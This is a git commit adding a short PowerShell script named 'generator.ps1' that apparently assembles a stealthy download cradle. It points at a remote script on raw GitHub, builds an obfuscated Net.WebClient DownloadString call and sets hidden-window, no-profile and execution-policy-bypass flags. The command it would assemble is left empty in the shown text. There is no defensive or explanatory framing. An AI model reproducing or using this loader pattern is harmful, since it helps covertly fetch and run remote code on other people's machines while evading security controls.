4330633f88505da860bc18688cb6b1a71b7503fe
43a1723 <hai1723notgay@gmail.com>
2024-06-20 14:56:16 +0700

    Create generator.ps1

---
+++ Extras/generator.ps1
@@ -0,0 +1,4 @@
+$powershellcode = ("https://raw.githubusercontent.com/43a1723/test/main/download.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$powershellcode')"
+$need = "-Win Hidden -NoP -ExecutionPolicy Bypass"
+$cmd = ""
